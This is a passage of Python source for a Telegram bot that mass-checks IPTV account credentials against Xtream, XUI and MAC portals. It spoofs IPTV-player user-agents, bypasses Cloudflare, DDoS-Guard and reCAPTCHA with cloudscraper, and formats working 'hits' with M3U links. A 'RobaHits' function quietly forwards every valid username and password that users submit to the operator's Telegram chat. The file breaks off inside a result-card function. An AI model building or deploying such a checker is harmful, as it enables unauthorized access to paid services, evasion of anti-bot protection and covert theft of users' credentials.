#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🦂 IPTV BOT ULTRA PRO — BY LUIS R 🦂  v3.0 SPEED EDITION
• Verificación ultra-rápida: TCP 3s + paralelo sin delays artificiales
• Soporte completo XUI One (playlist/) + Xtream Codes + MAC Portal
• Detección automática de protocolo por puerto (sin petición extra)
• Bypass Cloudflare/DDoS-Guard/reCAPTCHA con cloudscraper
• Streaming de listas 50MB+ sin timeout ni OOM
• Timeout total por cuenta: 25s máximo
• Loop de reconexión robusto 24/7
• RobaHits al admin automático
• Texas CST/CDT (America/Chicago)
"""

import os, re, json, time, threading, logging, socket, asyncio, random, pickle, traceback
from pathlib import Path
from urllib.parse import urlparse, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from datetime import datetime
import pytz
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    filters, ContextTypes, CallbackQueryHandler
)
from telegram.constants import ParseMode

requests.packages.urllib3.disable_warnings()

# ══════════════════════════════════════════════════════
#  ⚙️  VARIABLES — Railway → Variables
# ══════════════════════════════════════════════════════
BOT_TOKEN       = os.getenv("BOT_TOKEN", "")
ADMIN_ID        = int(os.getenv("ADMIN_ID", "0"))
RENDER_URL      = os.getenv("RENDER_URL", "")
ROBAHITS_CHATID = os.getenv("ROBAHITS_CHATID", "")
TZ_NAME         = os.getenv("TZ_NAME", "America/Chicago")
TZ              = pytz.timezone(TZ_NAME)
BOT_USERNAME    = "@Luishits_bot"

if not ROBAHITS_CHATID and ADMIN_ID:
    ROBAHITS_CHATID = str(ADMIN_ID)

logging.basicConfig(level=logging.INFO,
                    format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger(__name__)

# ── Estado global ──────────────────────────────────────
bot_active     = True
BOT_START_TIME = datetime.now(TZ)
STATS = {"checks": 0, "hits": 0, "fails": 0, "retries": 0, "users": set()}
LINE  = "━" * 28

FLAGS = {
    "US":"🇺🇸","MX":"🇲🇽","ES":"🇪🇸","AR":"🇦🇷","CO":"🇨🇴","CL":"🇨🇱",
    "PE":"🇵🇪","VE":"🇻🇪","BR":"🇧🇷","EC":"🇪🇨","UY":"🇺🇾","BO":"🇧🇴",
    "PA":"🇵🇦","DO":"🇩🇴","GT":"🇬🇹","CR":"🇨🇷","GB":"🇬🇧","DE":"🇩🇪",
    "FR":"🇫🇷","NL":"🇳🇱","CA":"🇨🇦","IT":"🇮🇹","PT":"🇵🇹","RU":"🇷🇺",
    "TR":"🇹🇷","IN":"🇮🇳","CN":"🇨🇳","JP":"🇯🇵","AU":"🇦🇺","SV":"🇸🇻",
    "HN":"🇭🇳","NI":"🇳🇮","PY":"🇵🇾","CU":"🇨🇺","PR":"🇵🇷","MA":"🇲🇦",
}

# ── Timeouts optimizados — rápido pero sin falsas negativas ──────────────────
TCP_TIMEOUT   = 3    # test de conectividad
CONN_TIMEOUT  = 6    # conexión HTTP
READ_TIMEOUT  = 12   # lectura HTTP  (era 30 → 12)
TOTAL_TIMEOUT = 25   # timeout global por verificación completa

# ── User-Agents IPTV reales ───────────────────────────────────────────────────
ALL_USER_AGENTS = [
    "TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
    "TiviMate/4.4.0 (Android 11)",
    "Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
    "Kodi/19.4 (Windows NT 10.0; Win64; x64) Kodi/19.4",
    "VLC/3.0.21 LibVLC/3.0.21",
    "VLC/3.0.18 LibVLC/3.0.18",
    "okhttp/4.9.0",
    "GSE SMART IPTV/7.4 (Android 11)",
    "MXPlayer/1.73.6 (Linux; Android 12) ExoPlayerLib/2.18.1",
    "Dalvik/2.1.0 (Linux; Android 10; Generic Android TV)",
    "Dalvik/2.1.0 (Linux; U; Android 11)",
    "SS_IPTV/3.9.0 (SmartTV)",
    "curl/7.88.1",
    "IPTV Smarters Pro/3.0.9.4 (Android 10)",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11) AppleWebKit/537.36 GSE/8.2 IPTV",
    "PerfectPlayer/1.6 CFNetwork/1399 Darwin/22.0.0",
    "Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 MAG200 stbapp ver: 2 rev: 250 Safari/533.3",
    "Mozilla/5.0 (SMART-TV; Linux; Tizen 5.0) AppleWebKit/538.1 (KHTML, like Gecko) Version/5.0 TV Safari/538.1",
]

# ── Dominios CF / DDoS-Guard conocidos ───────────────────────────────────────
CF_DOMAINS = [
    'star-flix.net','mylatinotvmoon.com','venuspv.me','mytitantv.com',
    'mymoontools.xyz','moonstalker.xyz','moontools.me','moonxtream.com',
    'titanxtv.com','venusiptv.com','latinchannel.tv','etvhosts.site',
]

# ── Clasificación de puertos por protocolo ───────────────────────────────────
HTTPS_PORTS = {"443","8443","2053","2083","2087","2096","8888"}
HTTP_PORTS  = {"80","8080","8000","8008","25461","2082","2086","55337"}

# ── Respuestas de texto plano = error de cuenta ───────────────────────────────
PLAIN_ERRORS = {
    "PLAYLIST_DISABLED": "Lista deshabilitada",
    "ACCOUNT_EXPIRED":   "Cuenta expirada",
    "ACCOUNT_BANNED":    "Cuenta bloqueada",
    "USER_NOT_FOUND":    "Usuario no encontrado",
    "INVALID_PASS":      "Contraseña incorrecta",
    "ACCOUNT_DISABLED":  "Cuenta deshabilitada",
    "TRIAL_EXPIRED":     "Trial expirado",
}

# ── Cookies Cloudflare persistentes ──────────────────────────────────────────
COOKIES_DIR = Path("cf_cookies")
COOKIES_DIR.mkdir(exist_ok=True)

# ── Pool de threads compartido — evita crear/destruir threads por cada check ─
_EXECUTOR = ThreadPoolExecutor(max_workers=20)

# ══════════════════════════════════════════════════════
#  🕐 UTILIDADES
# ══════════════════════════════════════════════════════

def now_str() -> str:
    return datetime.now(TZ).strftime("%Y-%m-%d %H:%M:%S")

def ts_to_date(epoch) -> str:
    try:
        v = int(epoch)
        if v > 0:
            return datetime.fromtimestamp(v, tz=TZ).strftime("%d/%m/%Y %H:%M")
    except Exception:
        pass
    return "Sin fecha"

def flag_from_code(code: str) -> str:
    """Genera emoji de bandera desde código ISO sin lookup table."""
    f = FLAGS.get(code, "")
    if not f and len(code) == 2:
        pts = [ord(c) + 127397 for c in code.upper()]
        f = chr(pts[0]) + chr(pts[1])
    return f

# ══════════════════════════════════════════════════════
#  🔧 PROTOCOLO / URL — Sin petición extra
# ══════════════════════════════════════════════════════

def _port_to_scheme(port_str: str, default: str = "http") -> str:
    """Detecta el protocolo correcto SOLO por el número de puerto (sin HTTP extra)."""
    if port_str in HTTPS_PORTS:
        return "https"
    if port_str in HTTP_PORTS:
        return "http"
    return default

def _schemes_for_portal(portal: str):
    """Retorna (scheme_preferido, scheme_fallback) según el puerto del portal."""
    port_str = portal.split(":")[1] if ":" in portal else "8080"
    primary = _port_to_scheme(port_str)
    alt     = "https" if primary == "http" else "http"
    return primary, alt

# ══════════════════════════════════════════════════════
#  🔍 EXTRACCIÓN DE URL — Universal
# ══════════════════════════════════════════════════════

def extract_from_url(text: str):
    """
    Extrae (portal, user, pwd, is_xui) de cualquier formato:
    - Xtream: get.php / player_api.php  con username= & password=
    - XUI One: /playlist/{user}/{pass}/...
    - MAC Portal: /c/ o /stalker_portal/
    - pipe separado: portal|user|pass
    - espacio separado: portal user pass
    Retorna (portal, user, pwd, is_xui_bool)
    """
    text = text.strip().replace("\r","").replace("%3A",":").replace("%2F","/")

    # ── XUI One / MAC playlist ────────────────────────────────────────────
    m = re.search(
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/playlist/([^/\s\n]+)/([^/\s\n?&]+)',
        text, re.IGNORECASE)
    if m:
        portal = m.group(1)
        user   = m.group(2)
        pwd    = m.group(3).split('?')[0].split('&')[0].strip()
        return portal, user, pwd, True

    # ── Xtream estándar ───────────────────────────────────────────────────
    patterns = [
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/get\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/player_api\.php\?username=([^&\s\n]+)&(?:amp;)?password=([^&\s\n]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/live/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/p/([^/\s\n]+)/([^/\s\n?]+)',
        r'(?:https?://)?([A-Za-z0-9._-]+(?::\d+)?)/c/[^/\s]*/([^/\s\n]+)/([^/\s\n?]+)',
    ]
    for p in patterns:
        m = re.search(p, text, re.IGNORECASE)
        if m:
            portal = m.group(1)
            user   = m.group(2)
            pwd    = m.group(3)
            for bad in ("&type=","&output=","&format=","\n"," "):
                pwd = pwd.split(bad)[0]
            pwd = pwd.split('&')[0].split('?')[0].strip()
            return portal, user, pwd, False

    # ── pipe o espacio ────────────────────────────────────────────────────
    if '|' in text:
        parts = [x.strip() for x in text.split('|')]
        if len(parts) >= 3 and parts[0]:
            return parts[0], parts[1], parts[2], False

    parts = text.split()
    if len(parts) == 3 and ('.' in parts[0] or ':' in parts[0]):
        return parts[0], parts[1], parts[2], False

    return None, None, None, False

# ══════════════════════════════════════════════════════
#  🍪 COOKIES CLOUDFLARE
# ══════════════════════════════════════════════════════

def _cookie_path(host: str) -> Path:
    return COOKIES_DIR / f"{host.split(':')[0].replace('.','_')}.pkl"

def _save_cookies(session, host: str):
    try:
        with open(_cookie_path(host), 'wb') as f:
            pickle.dump(dict(session.cookies), f)
    except Exception:
        pass

def _load_cookies(session, host: str):
    try:
        p = _cookie_path(host)
        if p.exists() and (time.time() - p.stat().st_mtime) < 3600:
            with open(p, 'rb') as f:
                session.cookies.update(pickle.load(f))
    except Exception:
        pass

def _is_cf(host: str) -> bool:
    h = host.lower().split(':')[0]
    return any(d in h for d in CF_DOMAINS)

# ══════════════════════════════════════════════════════
#  📡 SESIÓN HTTP — Rápida sin visita al home
# ══════════════════════════════════════════════════════

_UA_CYCLE = 0
_UA_LOCK  = threading.Lock()

def _next_ua() -> str:
    global _UA_CYCLE
    with _UA_LOCK:
        ua = ALL_USER_AGENTS[_UA_CYCLE % len(ALL_USER_AGENTS)]
        _UA_CYCLE += 1
        return ua

def _quick_session(host: str = "") -> requests.Session:
    """
    Sesión HTTP ligera y rápida:
    - Sin visita previa al home (era la causa principal de lentitud)
    - Sin retry automático (el retry lo gestiona verify_account)
    - Headers mínimos que funcionan con todos los paneles IPTV
    """
    s = requests.Session()
    s.mount("http://",  HTTPAdapter(max_retries=0))
    s.mount("https://", HTTPAdapter(max_retries=0))
    if host:
        _load_cookies(s, host)
    s.headers.update({
        "User-Agent":      _next_ua(),
        "Accept":          "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate",
        "Connection":      "close",
        "Cache-Control":   "no-cache",
    })
    return s

# ══════════════════════════════════════════════════════
#  🛡️  CLOUDFLARE / reCAPTCHA BYPASS
# ══════════════════════════════════════════════════════

def _cf_get(url: str, host: str, timeout: int = 15):
    """
    Bypass CF/DDoS-Guard/reCAPTCHA:
    1. Intenta cloudscraper con cookies guardadas
    2. Si falla, prueba con UA rotados normales
    No usa delays — velocidad primero.
    """
    # Intentar cloudscraper
    try:
        import cloudscraper
        scraper = cloudscraper.create_scraper(
            browser={"browser":"chrome","platform":"windows","mobile":False},
            delay=3
        )
        _load_cookies(scraper, host)
        r = scraper.get(url, timeout=timeout, verify=False, allow_redirects=True)
        if r.status_code == 200:
            raw = r.text.strip()
            if not (raw.startswith("<") and ("cloudflare" in raw.lower() or "just a moment" in raw.lower())):
                _save_cookies(scraper, host)
                return r
    except ImportError:
        pass
    except Exception as e:
        log.debug(f"cloudscraper err: {e}")

    # Fallback: UA rotados con sesión normal
    for ua in random.sample(ALL_USER_AGENTS, min(4, len(ALL_USER_AGENTS))):
        try:
            s = _quick_session(host)
            s.headers["User-Agent"] = ua
            # Headers que imitan navegador real para bypassear reCAPTCHA básico
            s.headers.update({
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "es-US,es;q=0.9,en;q=0.8",
                "Upgrade-Insecure-Requests": "1",
            })
            r = s.get(url, timeout=timeout, verify=False, allow_redirects=True)
            if r.status_code == 200:
                raw = r.text.strip()
                if not (raw.startswith("<") and
                        ("cloudflare" in raw.lower() or "just a moment" in raw.lower() or
                         "recaptcha" in raw.lower())):
                    _save_cookies(s, host)
                    return r
        except Exception:
            pass
    return None

# ══════════════════════════════════════════════════════
#  🔬 ANÁLISIS DE RESPUESTA
# ══════════════════════════════════════════════════════

def _parse_json(raw: str):
    raw = raw.strip()
    try:
        return json.loads(raw)
    except Exception:
        pass
    for ch in ('{', '['):
        idx = raw.find(ch)
        if idx >= 0:
            try:
                return json.loads(raw[idx:])
            except Exception:
                pass
    return None

def _analyze_json(data) -> tuple:
    """
    HIT   = auth=1 + status=Active (o Active con mayúscula/minúscula)
    CUSTOM = auth=1 + otro status
    FAIL  = auth=0
    RETRY = estructura inválida / incompleta
    """
    if not isinstance(data, dict):
        return "RETRY", None
    ui = data.get("user_info") or (data if "auth" in data else None)
    if ui is None:
        return "RETRY", None
    try:
        auth = int(ui.get("auth", -1))
    except Exception:
        return "RETRY", None
    if auth == 0:
        return "FAIL", None
    if auth == 1:
        real_ui = data.get("user_info", ui)
        payload = {"user_info": real_ui, "server_info": data.get("server_info", {})}
        status  = str(real_ui.get("status", "")).strip().lower()
        return ("HIT" if status == "active" else "CUSTOM"), payload
    return "RETRY", None

def _process(r) -> tuple:
    """
    Clasifica una respuesta HTTP en HIT / FAIL / CUSTOM / RETRY.
    Nunca lanza excepción — siempre retorna tupla.
    """
    if r is None:
        return "RETRY", None
    code = r.status_code

    # 404 = cuenta no existe en ese portal
    if code == 404:
        return "FAIL", None
    # 403/5xx = servidor vivo pero bloqueando → RETRY (no marcar como muerta)
    if code in (401, 403, 500, 502, 503, 504):
        return "RETRY", None
    if code not in (200, 206):
        return "RETRY", None

    try:
        raw = r.text.strip()
    except Exception:
        return "RETRY", None

    if not raw or len(raw) < 4:
        return "RETRY", None

    # HTML = CF / DDoS-Guard / reCAPTCHA
    if raw[0] == "<":
        low = raw.lower()
        if any(k in low for k in ("cloudflare","just a moment","recaptcha","ddos","attention required")):
            return "RETRY", None
        # HTML que NO es CF → servidor que responde HTML puro, no IPTV API
        return "RETRY", None

    # Respuestas de error en texto plano (XUI One, paneles propios)
    upper = raw.upper()
    for key, msg in PLAIN_ERRORS.items():
        if key in upper:
            return "FAIL", None

    # M3U directo → cuenta activa confirmada
    if raw.startswith("#EXTM3U") or raw.startswith("#EXT-X-"):
        return "HIT", {
            "user_info": {
                "auth":1, "status":"Active", "exp_date":"0",
                "active_cons":"?", "max_connections":"?",
                "is_trial":"0", "created_at":"0",
            },
            "server_info": {}, "m3u_direct": True,
        }

    data = _parse_json(raw)
    if data is None:
        return "RETRY", None
    return _analyze_json(data)

# ══════════════════════════════════════════════════════
#  ⚡ VERIFICACIÓN RÁPIDA — Una sola URL
# ══════════════════════════════════════════════════════

def _check_url(url: str, host: str) -> tuple:
    """Hace UNA petición rápida y retorna (result, payload)."""
    try:
        s = _quick_session(host)
        r = s.get(url, timeout=(CONN_TIMEOUT, READ_TIMEOUT),
                  verify=False, allow_redirects=True)
        _save_cookies(s, host)
        return _process(r)
    except requests.exceptions.Timeout:
        return "RETRY", None
    except requests.exceptions.ConnectionError:
        return "RETRY", None
    except Exception as e:
        log.debug(f"_check_url err: {e}")
        return "RETRY", None

# ══════════════════════════════════════════════════════
#  🚀 VERIFICACIÓN COMPLETA — Paralela y con timeout total
# ══════════════════════════════════════════════════════

def verify_account(portal: str, user: str, pwd: str, is_xui: bool = False) -> tuple:
    """
    Estrategia ultra-rápida (máx 25s total):

    Paso 1 — TCP 3s: si el host no responde → RETRY inmediato
    Paso 2 — Paralelo sin delay:
              • player_api.php (http + https)
              • get.php tipo m3u_plus (http + https)
              • playlist/user/pass/m3u_plus si is_xui (http + https)
              El primero que dé HIT/FAIL/CUSTOM gana; el resto se cancela.
    Paso 3 — Si todos RETRY y es dominio CF → bypass cloudscraper
    Paso 4 — Fallback: get.php básico sin parámetros extra
    Timeout total: TOTAL_TIMEOUT segundos
    """
    host    = portal.split(':')[0]
    port    = int(portal.split(':')[1]) if ':' in portal else 8080
    is_cf   = _is_cf(host)
    t_start = time.time()

    def elapsed():
        return time.time() - t_start

    def timed_out():
        return elapsed() >= TOTAL_TIMEOUT

    # ── Paso 1: TCP rápido ────────────────────────────────────────────────
    tcp_ok = False
    for p in (port, 80, 443):
        if timed_out():
            break
        try:
            conn = socket.create_connection((host, p), timeout=TCP_TIMEOUT)
            conn.close()
            tcp_ok = True
            break
        except Exception:
            pass

    if not tcp_ok:
        log.warning(f"TCP ❌ {host} → RETRY")
        return "RETRY", None

    # ── Paso 2: Peticiones paralelas sin delays ───────────────────────────
    primary, alt = _schemes_for_portal(portal)

    # Construir lista de URLs a probar — orden de mayor a menor probabilidad
    urls: list[str] = []

    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/player_api.php?username={user}&password={pwd}")
        urls.append(f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus")
        if is_xui:
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
            urls.append(f"{base}/playlist/{user}/{pwd}/m3u")

    # También probar siempre playlist/ en caso de que sea XUI aunque no se detectó
    for scheme in (primary, alt):
        base = f"{scheme}://{portal}"
        urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
        urls.append(f"{base}/get.php?username={user}&password={pwd}")

    # Deduplicar preservando orden
    seen = set()
    unique_urls = []
    for u in urls:
        if u not in seen:
            seen.add(u)
            unique_urls.append(u)

    # Lanzar todas en paralelo — timeout individual = READ_TIMEOUT
    remaining = TOTAL_TIMEOUT - elapsed()
    if remaining <= 0:
        return "RETRY", None

    futures = {
        _EXECUTOR.submit(_check_url, url, host): url
        for url in unique_urls
    }

    try:
        for fut in as_completed(futures, timeout=remaining):
            try:
                result, payload = fut.result()
                if result in ("HIT", "FAIL", "CUSTOM"):
                    # Cancelar el resto
                    for f in futures:
                        f.cancel()
                    log.info(f"✅ {result} en {elapsed():.1f}s | {futures[fut][:60]}")
                    return result, payload
            except Exception as e:
                log.debug(f"future err: {e}")
    except Exception:
        pass

    # ── Paso 3: Bypass CF si toca ─────────────────────────────────────────
    if is_cf and not timed_out():
        log.info(f"🛡️ CF bypass para {host}")
        for scheme in (primary, alt):
            if timed_out():
                break
            for endpoint in (
                f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}",
                f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
            ):
                if timed_out():
                    break
                r   = _cf_get(endpoint, host, timeout=10)
                res, pay = _process(r)
                if res != "RETRY":
                    log.info(f"✅ CF bypass {res} en {elapsed():.1f}s")
                    return res, pay

    # ── Paso 4: Fallback get.php básico ───────────────────────────────────
    if not timed_out():
        for scheme in (primary, alt):
            if timed_out():
                break
            url = f"{scheme}://{portal}/get.php?username={user}&password={pwd}"
            res, pay = _check_url(url, host)
            if res != "RETRY":
                return res, pay

    log.info(f"⚠️ RETRY {host} — {elapsed():.1f}s agotados")
    return "RETRY", None

# ══════════════════════════════════════════════════════
#  📊 CONTEO DE CONTENIDO — Paralelo con streaming
# ══════════════════════════════════════════════════════

def _count_json_objects(url: str, timeout_s: int = 10) -> str:
    """
    Cuenta objetos JSON en un array grande usando streaming (sin cargar todo en RAM).
    Funciona con listas de 50MB+.
    """
    try:
        s = _quick_session()
        resp = s.get(url, timeout=(CONN_TIMEOUT, timeout_s),
                     verify=False, stream=True)
        if resp.status_code != 200:
            resp.close()
            return ""
        depth = count = 0
        in_str = esc = started = False
        max_bytes = 20 * 1024 * 1024
        read = 0
        for chunk in resp.iter_content(chunk_size=65536):
            if not chunk:
                continue
            read += len(chunk)
            for ch in chunk.decode("utf-8", errors="ignore"):
                if esc:
                    esc = False; continue
                if ch == "\\" and in_str:
                    esc = True; continue
                if ch == '"':
                    in_str = not in_str; continue
                if in_str:
                    continue
                if ch == '[' and not started and depth == 0:
                    started = True; continue
                if not started:
                    continue
                if ch == '{':
                    depth += 1
                    if depth == 1:
                        count += 1
                elif ch == '}':
                    depth -= 1
                elif ch == ']' and depth == 0:
                    resp.close()
                    return str(count)
            if read >= max_bytes:
                resp.close()
                return str(count) if count else ""
        resp.close()
        return str(count) if count else ""
    except Exception:
        return ""

def _count_list(url: str, timeout_s: int = 8) -> str:
    """Cuenta items de un array JSON ligero (categorías ~KB)."""
    try:
        s = _quick_session()
        r = s.get(url, timeout=(CONN_TIMEOUT, timeout_s), verify=False)
        if r.status_code == 200:
            d = r.json()
            if isinstance(d, list):
                return str(len(d))
    except Exception:
        pass
    return ""

def get_content_counts(portal: str, user: str, pwd: str) -> tuple:
    """Obtiene Live/VOD/Series en paralelo con timeout de 20s total."""
    base = f"http://{portal}"
    urls = {
        "live": f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
        "vod":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_streams",
        "ser":  f"{base}/player_api.php?username={user}&password={pwd}&action=get_series",
        "vc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_categories",
        "sc":   f"{base}/player_api.php?username={user}&password={pwd}&action=get_series_categories",
    }

    results = {}
    futs = {
        _EXECUTOR.submit(_count_json_objects, urls["live"], 12): "live",
        _EXECUTOR.submit(_count_json_objects, urls["vod"],  12): "vod",
        _EXECUTOR.submit(_count_json_objects, urls["ser"],  12): "ser",
    }

    deadline = time.time() + 18
    for fut in as_completed(futs, timeout=max(0, deadline - time.time())):
        try:
            results[futs[fut]] = fut.result() or ""
        except Exception:
            pass

    # Fallback a categorías si streams no respondieron
    cat_futs = {}
    if not results.get("vod"):
        cat_futs[_EXECUTOR.submit(_count_list, urls["vc"], 6)] = "vod"
    if not results.get("ser"):
        cat_futs[_EXECUTOR.submit(_count_list, urls["sc"], 6)] = "ser"

    if cat_futs:
        for fut in as_completed(cat_futs, timeout=8):
            try:
                key = cat_futs[fut]
                results[key] = results.get(key) or fut.result() or ""
            except Exception:
                pass

    live  = results.get("live") or "N/D"
    vod   = results.get("vod")  or "N/D"
    serie = results.get("ser")  or "N/D"
    return live, vod, serie

def get_categories(portal: str, user: str, pwd: str, limit: int = 20) -> str:
    """Obtiene categorías live con conteo de canales por categoría."""
    try:
        ua = _next_ua()
        base = f"http://{portal}"
        r = requests.get(
            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
            headers={"User-Agent": ua}, timeout=(CONN_TIMEOUT, 10), verify=False)
        if r.status_code != 200:
            return ""
        cats = r.json()
        if not isinstance(cats, list) or not cats:
            return ""

        # Intentar obtener conteo por categoría con streaming
        count_map: dict = {}
        try:
            resp = requests.get(
                f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
                headers={"User-Agent": ua}, timeout=(CONN_TIMEOUT, 15),
                verify=False, stream=True)
            if resp.status_code == 200:
                raw_chunks = []
                read = 0
                for chunk in resp.iter_content(65536):
                    raw_chunks.append(chunk)
                    read += len(chunk)
                    if read >= 8 * 1024 * 1024:
                        break
                resp.close()
                for ch in json.loads(b"".join(raw_chunks).decode("utf-8", errors="ignore")):
                    cid = str(ch.get("category_id",""))
                    count_map[cid] = count_map.get(cid, 0) + 1
        except Exception:
            pass

        lines = []
        for c in cats[:limit]:
            name = c.get("category_name","").replace("\\/","/").strip()
            cid  = str(c.get("category_id",""))
            if not name:
                continue
            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
            lines.append(f"  ➠ {name}{cnt}")
        if len(cats) > limit:
            lines.append(f"  ➕ ...y {len(cats)-limit} categorías más")
        return "\n".join(lines)
    except Exception:
        return ""

def get_location(portal: str) -> str:
    try:
        ip = portal.split(":")[0]
        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=4, verify=False)
        if r.status_code == 200:
            d = r.json()
            if d.get("status") == "success":
                code = d.get("countryCode","")
                return f"{d.get('country','?')} {flag_from_code(code)}"
    except Exception:
        pass
    return "Desconocido 🌍"

# ══════════════════════════════════════════════════════
#  🔔 ROBAHITS
# ══════════════════════════════════════════════════════

def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
    if not BOT_TOKEN or not ROBAHITS_CHATID:
        return
    try:
        expire = ts_to_date(ui.get("exp_date", 0))
        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
        text   = (
            f"🦂 <b>ROBO HIT — LUIS R</b> 🦂\n\n"
            f"👤 Verificado por: @{from_user}\n\n"
            f"🌐 Portal: <code>{portal}</code>\n"
            f"👤 Usuario: <code>{user}</code>\n"
            f"🔑 Pass: <code>{pwd}</code>\n"
            f"⏲ Vence: {expire}\n"
            f"📺 {live} | 🎥 {vod} | 📹 {series}\n"
            f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
            f"🕐 {now_str()}\n🦂 {BOT_USERNAME}"
        )
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={"chat_id": ROBAHITS_CHATID, "text": text,
                  "parse_mode": "HTML", "disable_web_page_preview": True},
            timeout=10
        )
    except Exception as e:
        log.warning(f"RobaHit err: {e}")

# ══════════════════════════════════════════════════════
#  🃏 TARJETAS DE RESULTADO
# ══════════════════════════════════════════════════════

def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
    expire   = ts_to_date(ui.get("exp_date", 0))
    created  = ts_to_date(ui.get("created_at", 0))
    active   = ui.get("active_cons", "?")
    maxcon   = ui.get("max_connections", "?")
    status   = ui.get("status", "Active")
    trial    = "No Trial" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Trial"
    location = get_location(portal)
    m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
    epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟢 CUENTA VÁLIDA\n"
    t += f"➥ 🆙 Estado: ✅ {status.upper()}\n"
    t += f"➥ 🧪 Trial: {trial}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ 📅 Creada: {created}\n"
    t += f"➥ ⏲ Vence: {expire}\n"
    t += f"➥ 👁 Conexiones: {active} / {maxcon}\n"
    t += f"➥ 📍 País: {location}\n"
    t += f"{LINE}\n     ★彡ᴄ᷊ɴᴛᴇɴᴛ彡★\n{LINE}\n"
    t += f"➥ 📺 En Vivo: {live}\n"
    t += f"➥ 🎥 VOD: {vod}\n"
    t += f"➥ 📹 Series: {series}\n"
    t += f"{LINE}\n"
    t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
    if cats:
        t += f"{LINE}\n   ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n{LINE}\n{cats}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_custom(portal, user, pwd, ui, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🟡 CUENTA EXISTE — NO ACTIVA\n"
    t += f"➥ 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
    t += f"➥ ⏲ Vence: {ts_to_date(ui.get('exp_date',0))}\n"
    t += f"➥ 👥 Max: {ui.get('max_connections','?')}\n"
    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_fail(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ 🔴 CUENTA INVÁLIDA\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n   ❌ Credenciales incorrectas\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
    return t

def card_retry(portal, user, tg_user) -> str:
    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
    t += f"➥ ⚠️ SIN RESPUESTA VÁLIDA\n"
    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
    t += f"{LINE}\n"
    t += f"   ❓ Servidor sin respuesta JSON válida\n"
    t += f"   📡 Puede ser activa — intenta con la URL completa\n"
    t += f"   🔁 Pega la URL /get.php completa o usa /debug\n"
    t += f"   ✔️ Verificado para @{tg_user}\n"
